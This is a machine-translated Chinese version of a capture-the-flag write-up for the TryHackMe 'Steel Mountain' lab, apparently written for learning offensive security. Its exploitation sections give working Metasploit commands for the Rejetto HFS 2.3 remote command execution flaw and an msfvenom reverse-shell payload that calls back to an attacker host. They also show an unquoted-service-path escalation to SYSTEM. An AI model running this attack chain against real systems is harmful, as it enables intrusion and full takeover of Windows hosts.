<html>
<head>
<title>TryHackMe writeup: Steel Mountain</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe报道:钢铁之山</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-writeup-steel-mountain-d052141f8901?source=collection_archive---------0-----------------------#2022-03-11">https://infosecwriteups.com/tryhackme-writeup-steel-mountain-d052141f8901?source=collection_archive---------0-----------------------#2022-03-11</a></blockquote><div><div class="fc ii ij ik il im"/><div class="in io ip iq ir"><div class=""/><p id="9022" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">钢铁山(<a class="ae kp" href="https://tryhackme.com/room/steelmountain" rel="noopener ugc nofollow" target="_blank">“TryHackMe”，2019 </a>)是一个<em class="kq"> TryHackMe贵宾室</em>，以<em class="kq">机器人先生</em>为主题。它是相当初级的，旨在为初级渗透测试人员甚至是“完全的初学者”提供一些侵入基于Windows的boot2root虚拟机的经验。我能够完成涉及Metasploit的部分——但是<strong class="jt iv">不能</strong>完成涉及手工开发的任务(<a class="ae kp" href="https://tryhackme.com/room/steelmountain" rel="noopener ugc nofollow" target="_blank">同上，任务4 </a>)。在本文中，我将讨论在boot2root系统上获得root权限的过程。</p><figure class="ks kt ku kv gu kw gi gj paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gi gj kr"><img src="../Images/d2fda67ebbf7173a9874dcd26d54d750.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kSUXqzlj-A4wSysE1gOniA.png"/></div></div><figcaption class="ld le gk gi gj lf lg bd b be z dk translated">基础图片:<a class="ae kp" href="https://wiki.teamfortress.com/wiki/Thunder_Mountain" rel="noopener ugc nofollow" target="_blank">团队要塞2 Wiki(未注明)</a>和<a class="ae kp" href="https://telltaletv.com/2019/11/preview-mr-robot-season-4-episode-5-method-not-allowed/mr-robot-season-4-59/" rel="noopener ugc nofollow" target="_blank"> Gilstorf (2019) </a></figcaption></figure><h1 id="e4d0" class="lh li iu bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">程序</h1><h2 id="905d" class="mf li iu bd lj mg mh dn ln mi mj dp lr kc mk ml lv kg mm mn lz kk mo mp md mq bi translated">初始探测</h2><p id="e5f1" class="pw-post-body-paragraph jr js iu jt b ju mr jw jx jy ms ka kb kc mt ke kf kg mu ki kj kk mv km kn ko in bi translated">与TryHackMe boot2root机器一样，我首先点击绿色的“Start Machine”按钮来启动虚拟机，然后等待大约五分钟。实验室问的第一个问题是“谁是本月最佳员工？”这让我认为boot2root机器在端口80上运行某种web服务器。所以，我随便浏览了一下网站，偶然发现了这个:</p><figure class="ks kt ku kv gu kw gi gj paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gi gj mw"><img src="../Images/0fe2456c7aba32c1fd75593feef42efb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*811RYqkdTN1ckKzc6bA8eQ.png"/></div></div><figcaption class="ld le gk gi gj lf lg bd b be z dk translated">“钢铁之山”的主页</figcaption></figure><p id="9048" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">“本月最佳员工”的名字很容易确定:它就在源图像文件的文件名中。它可以被发现，特别是在Firefox上，通过右击图像并选择“复制图像链接”</p></div><div class="ab cl mx my hy mz" role="separator"><span class="na bw bk nb nc nd"/><span class="na bw bk nb nc nd"/><span class="na bw bk nb nc"/></div><div class="in io ip iq ir"><p id="33ac" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我转到探测的更多技术方面，从使用以下标志的强制<em class="kq"> nmap </em>扫描开始:</p><p id="8e65" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe ne nf ng nh b">nmap -sT -A -v &lt;boot2root ip&gt; -Pn -p- -O -sC -oX tcp_scan.xml</code></p><p id="d570" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">房间里提到boot2root虚拟机运行的是Windows，也就是默认不响应pings。因此，我使用<code class="fe ne nf ng nh b">-Pn</code>标志让<em class="kq"> nmap </em>在禁用主机发现的情况下扫描boot2root虚拟机——绕过了这个过程中的限制。</p><p id="0698" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">查看<em class="kq"> nmap </em>输出，boot2root虚拟机正在运行一个有趣的服务:</p><pre class="ks kt ku kv gu ni nh nj nk aw nl bi"><span id="ae25" class="mf li iu nh b gz nm nn l no np">8080/tcp open http HttpFileServer httpd 2.3<br/>|_http-title: HFS /<br/>|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1<br/>|_http-server-header: HFS 2.3<br/>| http-methods: <br/>|_   Supported Methods: GET HEAD POST</span></pre><p id="66ff" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe ne nf ng nh b">HttpFileServer httpd 2.3</code>版本信息指的是Rejetto HTTP文件服务器(<a class="ae kp" href="http://rejetto.com/hfs/" rel="noopener ugc nofollow" target="_blank">Rejetto.com，n . d .</a>)——显然指的是2.3版本。正如我将在下一小节中演示的，该服务容易受到远程命令执行漏洞的攻击。</p><h2 id="92c2" class="mf li iu bd lj mg mh dn ln mi mj dp lr kc mk ml lv kg mm mn lz kk mo mp md mq bi translated">剥削</h2><p id="1318" class="pw-post-body-paragraph jr js iu jt b ju mr jw jx jy ms ka kb kc mt ke kf kg mu ki kj kk mv km kn ko in bi translated">我的下一步是启动Metasploit框架…</p><pre class="ks kt ku kv gu ni nh nj nk aw nl bi"><span id="61e1" class="mf li iu nh b gz nm nn l no np"><strong class="nh iv">└─$ sudo msfconsole</strong></span><span id="9a21" class="mf li iu nh b gz nq nn l no np">[... snip ...]</span><span id="1653" class="mf li iu nh b gz nq nn l no np">=[ metasploit v6.1.26-dev ]<br/>+ — — =[ 2194 exploits — 1162 auxiliary — 400 post ]<br/>+ — — =[ 596 payloads — 45 encoders — 10 nops ]<br/>+ — — =[ 9 evasion ]</span><span id="16fc" class="mf li iu nh b gz nq nn l no np">Metasploit tip: Search can apply complex filters such as <br/>search cve:2009 type:exploit, see all the filters <br/>with help search</span><span id="313f" class="mf li iu nh b gz nq nn l no np"><strong class="nh iv">msf6 &gt; </strong></span></pre><p id="61e0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">…然后配置并启动漏洞利用:</p><pre class="ks kt ku kv gu ni nh nj nk aw nl bi"><span id="61b1" class="mf li iu nh b gz nm nn l no np"><strong class="nh iv">msf6 &gt;</strong> <strong class="nh iv">use exploit/windows/http/rejetto_hfs_exec</strong><br/>[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp<br/><strong class="nh iv">msf6 exploit(windows/http/rejetto_hfs_exec) &gt;</strong> <strong class="nh iv">set PAYLOAD windows/x64/meterpreter/reverse_tcp<br/></strong>PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp<br/><strong class="nh iv">msf6 exploit(windows/http/rejetto_hfs_exec) &gt;</strong> <strong class="nh iv">set RHOSTS &lt;boot2root ip&gt;</strong><br/>RHOSTS =&gt; &lt;boot2root ip&gt;<br/><strong class="nh iv">msf6 exploit(windows/http/rejetto_hfs_exec) &gt;</strong> <strong class="nh iv">set RPORT 8080</strong><br/>RPORT =&gt; 8080<br/><strong class="nh iv">msf6 exploit(windows/http/rejetto_hfs_exec) &gt;</strong> <strong class="nh iv">set LHOST &lt;attackbox ip&gt;</strong><br/>LHOST =&gt; &lt;attackbox ip&gt;<br/><strong class="nh iv">msf6 exploit(windows/http/rejetto_hfs_exec)</strong> &gt; <strong class="nh iv">set SRVHOST &lt;attackbox ip&gt;</strong><br/>SRVHOST =&gt; &lt;attackbox ip&gt;<br/><strong class="nh iv">msf6 exploit(windows/http/rejetto_hfs_exec) &gt;</strong> <strong class="nh iv">exploit</strong></span><span id="ea71" class="mf li iu nh b gz nq nn l no np">[*] Started reverse TCP handler on &lt;attackbox ip&gt;:4444 <br/>[*] Using URL: http://&lt;attackbox ip&gt;:8080/EFTPYjGK3Xe<br/>[*] Server started.<br/>[*] Sending a malicious request to /<br/>[*] Payload request received: /EFTPYjGK3Xe<br/>[*] Sending stage (175174 bytes) to &lt;boot2root ip&gt;<br/>[*] Meterpreter session 1 opened (&lt;attackbox ip&gt;:4444 -&gt; &lt;boot2root ip&gt;:49322 ) at [redacted]</span><span id="e967" class="mf li iu nh b gz nq nn l no np"><strong class="nh iv">meterpreter &gt;</strong></span></pre><p id="e263" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">现在我可以去拿旗子了。我首先列出了我所在的当前目录(Cmd。1)然后移动到当前用户的帐户文件夹(Cmd。2).然后，我搜索扩展名为<code class="fe ne nf ng nh b">.txt</code>的文件(Cmd。3)找到一个有趣的文件，完整路径为:<code class="fe ne nf ng nh b">c:\Users\bill\Desktop\user.txt</code>。最后，我只是转储了标志的文本文件(Cmd。4).</p><pre class="ks kt ku kv gu ni nh nj nk aw nl bi"><span id="f5a7" class="mf li iu nh b gz nm nn l no np"><strong class="nh iv">[1] meterpreter &gt;</strong> <strong class="nh iv">pwd</strong><br/>C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<br/><strong class="nh iv">[2] meterpreter &gt;</strong> <strong class="nh iv">cd C:\\Users\\bill<br/>[3] meterpreter &gt;</strong> <strong class="nh iv">search -f *.txt</strong><br/>Found 59 results...<br/>===================<br/>Path    Size (bytes)     Modified (UTC)                                                                                                                                                          <br/>----    ------------     --------------                                                                                               <br/>c:\Program Files (x86)\IObit\Advanced SystemCare\Display_log.txt                                                                                                    586           [redacted] -0500<br/>c:\Program Files (x86)\IObit\Advanced SystemCare\Update History.txt                                                                                                 8386          2016-07-27 17:09:38 -0400<br/>[... snip ...]<br/>c:\Users\bill\Desktop\user.txt                                                                                                                                      70            2019-09-27 08:42:38 -0400<br/>[... snip ...]<br/><strong class="nh iv">[4] meterpreter &gt; cat C:\\Users\\bill\\Desktop\\user.txt</strong><br/>[redacted]</span></pre><h2 id="cc62" class="mf li iu bd lj mg mh dn ln mi mj dp lr kc mk ml lv kg mm mn lz kk mo mp md mq bi translated">后剥削</h2><p id="e8a6" class="pw-post-body-paragraph jr js iu jt b ju mr jw jx jy ms ka kb kc mt ke kf kg mu ki kj kk mv km kn ko in bi translated">有了远程计算机的shell，我可以继续进行更多关于它的“有趣”的活动，比如后门和抢劫。但是在我这样做之前，我需要有管理员甚至系统特权。</p><p id="d6a2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">不幸的是，我还没有这样的特权:</p><pre class="ks kt ku kv gu ni nh nj nk aw nl bi"><span id="0ce2" class="mf li iu nh b gz nm nn l no np"><strong class="nh iv">meterpreter &gt; getuid</strong><br/>Server username: STEELMOUNTAIN\bill</span></pre><p id="6ba5" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">为了升级权限，我将使用<a class="ae kp" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" rel="noopener ugc nofollow" target="_blank">《powershell mafia》(2017)</a>开发的<em class="kq"> PowerUp </em>脚本来枚举系统。我将它下载到我的攻击箱，然后上传到boot2root机器:</p><pre class="ks kt ku kv gu ni nh nj nk aw nl bi"><span id="f22b" class="mf li iu nh b gz nm nn l no np"><strong class="nh iv">meterpreter &gt; upload ~/steelmountain/PowerUp.ps1</strong> .<br/>[*] uploading : ~/steelmountain/PowerUp.ps1 -&gt; .<br/>[*] uploaded : ~/steelmountain/PowerUp.ps1 -&gt; .\PowerUp.ps1<br/><strong class="nh iv">meterpreter &gt; pwd</strong><br/>C:\Users\bill\Desktop<br/><strong class="nh iv">meterpreter &gt; ls</strong><br/>Listing: C:\Users\bill\Desktop<br/>==============================</span><span id="3b27" class="mf li iu nh b gz nq nn l no np">Mode   Size   Type   Last modified   Name<br/>----   ----   ----   --------------  ----<br/>100666/rw-rw-rw- 600580 fil [redacted] -0500 PowerUp.ps1<br/>100666/rw-rw-rw- 282 fil 2019–09–27 07:07:07 -0400 desktop.ini<br/>100666/rw-rw-rw- 70 fil 2019–09–27 08:42:38 -0400 user.txt</span></pre><p id="d8b3" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">现在，我开始用<em class="kq">加电</em>脚本列举系统:</p><pre class="ks kt ku kv gu ni nh nj nk aw nl bi"><span id="9d60" class="mf li iu nh b gz nm nn l no np"><strong class="nh iv">[1] meterpreter &gt; load powershell</strong><br/>Loading extension powershell… Success.<br/><strong class="nh iv">[2] meterpreter &gt; powershell_shell</strong><br/><strong class="nh iv">[3] PS &gt; pwd</strong></span><span id="7d4d" class="mf li iu nh b gz nq nn l no np">Path<br/>----<br/>C:\Users\bill\Desktop</span><span id="adf2" class="mf li iu nh b gz nq nn l no np"><strong class="nh iv">[4] PS &gt; . .\PowerUp.ps1</strong><br/><strong class="nh iv">[5] PS &gt; Invoke-AllChecks</strong></span><span id="46d3" class="mf li iu nh b gz nq nn l no np">ServiceName           : AdvancedSystemCareService9<br/>Path                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe<br/>ModifiablePath        : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}<br/>StartName             : LocalSystem<br/>AbuseFunction         : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path &lt;HijackPath&gt;<br/>CanRestart            : True<br/>Name                  : AdvancedSystemCareService9<br/>Check                 : Unquoted Service Paths</span><span id="5a42" class="mf li iu nh b gz nq nn l no np">[… snip …]</span></pre><p id="9417" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我首先加载了Meterpreter的<code class="fe ne nf ng nh b">powershell</code>扩展(Cmd。1)，进入PowerShell环境(Cmd。2)只是想确保我在<code class="fe ne nf ng nh b">bill</code>的桌面文件夹(Cmd。3).然后，我从<em class="kq">加电</em>脚本(Cmd)加载功能。4)并继续列举系统中的服务(Cmd。5).</p></div><div class="ab cl mx my hy mz" role="separator"><span class="na bw bk nb nc nd"/><span class="na bw bk nb nc nd"/><span class="na bw bk nb nc"/></div><div class="in io ip iq ir"><p id="23b1" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我注意到<code class="fe ne nf ng nh b">AdvancedSystemCareService9</code>服务的<code class="fe ne nf ng nh b">CanRestart</code>配置被设置为True，并且显示有一个<em class="kq">未引用的服务路径漏洞</em>。我对这种漏洞不太熟悉，所以我查了一下，偶然看到一个指南(<a class="ae kp" href="https://www.hackingarticles.in/windows-privilege-escalation-unquoted-service-path/" rel="noopener ugc nofollow" target="_blank"> Chandel，2021 </a>)讨论如何利用它。</p><p id="eed9" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">事实证明，通用的<em class="kq">未引用的服务路径漏洞</em>相当容易被利用；这和DLL搜索命令劫持非常相似(<a class="ae kp" href="https://attack.mitre.org/techniques/T1574/001/" rel="noopener ugc nofollow" target="_blank"> ATT &amp; CK框架，n.d. </a>)。基本思想是Windows API假设服务可执行文件路径不包含任何空格(<a class="ae kp" href="https://attack.mitre.org/techniques/T1574/001/" rel="noopener ugc nofollow" target="_blank"> Chandel，2021 </a>)。如果存在文件空间，则可以“游戏”加载服务可执行文件的搜索顺序，并加载有效载荷而不是预期的服务(<a class="ae kp" href="https://attack.mitre.org/techniques/T1574/001/" rel="noopener ugc nofollow" target="_blank">同上</a>)。</p><p id="1ec5" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">为了演示这一点，我将使用<code class="fe ne nf ng nh b">msfvenom</code>来生成一个反向的Meterpreter会话:</p><pre class="ks kt ku kv gu ni nh nj nk aw nl bi"><span id="a626" class="mf li iu nh b gz nm nn l no np"><strong class="nh iv">└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;attackbox ip&gt; LPORT=4445 -f exe -o Advanced.exe</strong><br/>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br/>[-] No arch selected, selecting arch: x64 from the payload<br/>No encoder specified, outputting raw payload<br/>Payload size: 510 bytes<br/>Final size of exe file: 7168 bytes<br/>Saved as: Advanced.exe</span></pre><p id="7716" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">上传到正确的路径:</p><pre class="ks kt ku kv gu ni nh nj nk aw nl bi"><span id="34ca" class="mf li iu nh b gz nm nn l no np"><strong class="nh iv">meterpreter &gt; upload ~/steelmountain/Advanced.exe “C:\\Program Files (x86)\\IObit\\Advanced.exe”</strong><br/>[*] uploading : ~/steelmountain/Advanced.exe -&gt; C:\Program Files (x86)\IObit\Advanced.exe<br/>[*] Uploaded 7.00 KiB of 7.00 KiB (100.0%): ~/steelmountain/Advanced.exe -&gt; C:\Program Files (x86)\IObit\Advanced.exe<br/>[*] uploaded : ~/steelmountain/Advanced.exe -&gt; C:\Program Files (x86)\IObit\Advanced.exe</span></pre><p id="3932" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后打开另一个Metasploit会话来侦听Meterpreter会话呼叫总部:</p><pre class="ks kt ku kv gu ni nh nj nk aw nl bi"><span id="c11a" class="mf li iu nh b gz nm nn l no np"><strong class="nh iv">msf6 &gt; use exploit/multi/handler</strong><br/>[*] Using configured payload generic/shell_reverse_tcp<br/><strong class="nh iv">msf6 exploit(multi/handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</strong><br/>PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp<br/><strong class="nh iv">msf6 exploit(multi/handler) &gt; set LHOST &lt;attackbox ip&gt;</strong><br/>LHOST =&gt; &lt;attackbox ip&gt;<br/><strong class="nh iv">msf6 exploit(multi/handler) &gt; set LPORT 4445</strong><br/>LPORT =&gt; 4445<br/><strong class="nh iv">msf6 exploit(multi/handler) &gt; exploit</strong></span><span id="c525" class="mf li iu nh b gz nq nn l no np">[*] Started reverse TCP handler on &lt;attackbox ip&gt;:4445</span></pre><p id="a8f7" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">最后，重启<code class="fe ne nf ng nh b">AdvancedSystemCareService9</code>服务:</p><pre class="ks kt ku kv gu ni nh nj nk aw nl bi"><span id="d943" class="mf li iu nh b gz nm nn l no np"><strong class="nh iv">meterpreter &gt; shell</strong><br/>Process 812 created.<br/>Channel 7 created.<br/>Microsoft Windows [Version 6.3.9600]<br/>© 2013 Microsoft Corporation. All rights reserved.</span><span id="6ad2" class="mf li iu nh b gz nq nn l no np"><strong class="nh iv">C:\Users\bill\Desktop&gt;net stop AdvancedSystemCareService9</strong><br/>net stop AdvancedSystemCareService9<br/>.<br/>The Advanced SystemCare Service 9 service was stopped successfully.</span><span id="48a2" class="mf li iu nh b gz nq nn l no np"><strong class="nh iv">C:\Users\bill\Desktop&gt;net start AdvancedSystemCareService9</strong><br/>net start AdvancedSystemCareService9</span></pre><p id="26a3" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我获得了反向Meterpreter会话和全部权限(Cmd。1)但很快不得不迁移到更稳定的流程(Cmd。2).</p><pre class="ks kt ku kv gu ni nh nj nk aw nl bi"><span id="67df" class="mf li iu nh b gz nm nn l no np">[*] Started reverse TCP handler on &lt;attackbox ip&gt;:4445 <br/>[*] Sending stage (200262 bytes) to &lt;boot2root ip&gt;<br/>[*] Meterpreter session 3 opened (&lt;attackbox ip&gt;:4445 -&gt; &lt;boot2root ip&gt;:49516 ) at [redacted] -0500</span><span id="7552" class="mf li iu nh b gz nq nn l no np"><strong class="nh iv">[1] meterpreter &gt; getuid</strong><br/>Server username: NT AUTHORITY\SYSTEM<br/><strong class="nh iv">[2] meterpreter &gt; migrate 2068</strong><br/>[*] Migrating from 3292 to 2068…<br/>[*] Migration completed successfully.</span></pre><p id="7069" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我终于可以搜索根标志并转储它了:</p><pre class="ks kt ku kv gu ni nh nj nk aw nl bi"><span id="bb12" class="mf li iu nh b gz nm nn l no np"><strong class="nh iv">meterpreter &gt; search -f root.txt</strong><br/>Found 1 result…<br/>=================</span><span id="cb61" class="mf li iu nh b gz nq nn l no np">Path Size (bytes)    Modified (UTC)<br/>-----------------    --------------<br/>c:\Users\Administrator\Desktop\root.txt 32 2019–09–27 08:41:10 -0400</span><span id="0a53" class="mf li iu nh b gz nq nn l no np"><strong class="nh iv">meterpreter &gt; cat "c:\Users\Administrator\Desktop\root.txt"</strong><br/>[redacted]<strong class="nh iv">meterpreter &gt;</strong></span></pre><h1 id="cc3d" class="lh li iu bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">结论</h1><p id="98b9" class="pw-post-body-paragraph jr js iu jt b ju mr jw jx jy ms ka kb kc mt ke kf kg mu ki kj kk mv km kn ko in bi translated">钢铁山房间还有一个任务，要求争夺者在没有 Metasploit的情况下黑入boot 2 root VM<em class="kq">(<a class="ae kp" href="https://tryhackme.com/room/steelmountain" rel="noopener ugc nofollow" target="_blank">《tryhackme》2019，任务4 </a>)。我还没有这样做，但会计划在不久的将来这样做；-)</em></p><p id="6d27" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我仍然想写这篇文章，希望能为那些对攻击性安全感兴趣的人提供参考。</p><h1 id="cd1c" class="lh li iu bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">参考</h1><p id="3398" class="pw-post-body-paragraph jr js iu jt b ju mr jw jx jy ms ka kb kc mt ke kf kg mu ki kj kk mv km kn ko in bi translated">ATT和CK框架(未标明)。<em class="kq">劫持执行流程:DLL搜索命令劫持</em>。米特公司。2022年3月9日检索自:<a class="ae kp" href="https://attack.mitre.org/techniques/T1574/001/" rel="noopener ugc nofollow" target="_blank">https://attack.mitre.org/techniques/T1574/001/</a></p><p id="56b5" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">钱德尔河(2021)。<em class="kq"> Windows权限提升:未引用的服务路径</em>。黑客文章。2022年3月9日检索自:<a class="ae kp" href="https://www.hackingarticles.in/windows-privilege-escalation-unquoted-service-path/" rel="noopener ugc nofollow" target="_blank">https://www . hacking articles . in/windows-privilege-escalation-un quoted-service-path/</a></p><p id="80f0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Gilstorf，A. (2019)。机器人先生第四季第六集——卡莉·查肯饰演达琳·奥尔德逊，拉米·马雷克饰演埃利奥特·奥尔德逊。泄密电视。2022年3月6日检索自:<a class="ae kp" href="https://telltaletv.com/2019/11/preview-mr-robot-season-4-episode-5-method-not-allowed/mr-robot-season-4-59/" rel="noopener ugc nofollow" target="_blank">https://telltaletv . com/2019/11/preview-Mr-robot-season-4-episode-5-method-not-allowed/Mr-robot-season-4-59/</a></p><p id="a6cf" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《powershell mafia》(2017)。<em class="kq"> PowerSploit/PowerUp.ps1 </em>。GitHub仓库。2022年3月9日检索自:<a class="ae kp" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" rel="noopener ugc nofollow" target="_blank">https://github . com/powershell mafia/PowerSploit/blob/master/Privesc/power up . PS1</a></p><p id="2294" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Rejetto.com(未标出)。<em class="kq"> HFS ~ HTTP文件服务器</em>。2022年3月9日检索自:<a class="ae kp" href="http://rejetto.com/hfs/" rel="noopener ugc nofollow" target="_blank">http://rejetto.com/hfs/</a></p><p id="4e7b" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">团队堡垒2维基(未注明)。<em class="kq">雷山</em>。2022年3月9日检索自:<a class="ae kp" href="https://wiki.teamfortress.com/wiki/Thunder_Mountain" rel="noopener ugc nofollow" target="_blank">https://wiki.teamfortress.com/wiki/Thunder_Mountain</a></p><p id="1f59" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《tryhackme》(2019)。<em class="kq">钢铁山</em>。TryHackMe。2022年3月9日检索自:<a class="ae kp" href="https://tryhackme.com/room/steelmountain" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/steelmountain</a></p></div><div class="ab cl mx my hy mz" role="separator"><span class="na bw bk nb nc nd"/><span class="na bw bk nb nc nd"/><span class="na bw bk nb nc"/></div><div class="in io ip iq ir"><p id="5d90" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Infosec Writeups团队刚刚完成了我们的第一次虚拟网络安全会议和网络活动。我们有16位出色的演讲者，他们主持了非常有价值和鼓舞人心的会议。要查看演讲者和主题列表，请点击此处。</p><div class="nr ns gq gs nt nu"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="nv ab fp"><div class="nw ab nx cl cj ny"><h2 class="bd iv gz z fq nz fs ft oa fv fx it bi translated">IWCon2022 — Infosec书面报告虚拟会议</h2><div class="ob l"><h3 class="bd b gz z fq nz fs ft oa fv fx dk translated">与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…</h3></div><div class="oc l"><p class="bd b dl z fq nz fs ft oa fv fx dk translated">iwcon.live</p></div></div><div class="od l"><div class="oe l of og oh od oi lb nu"/></div></div></a></div></div></div>    
</body>
</html>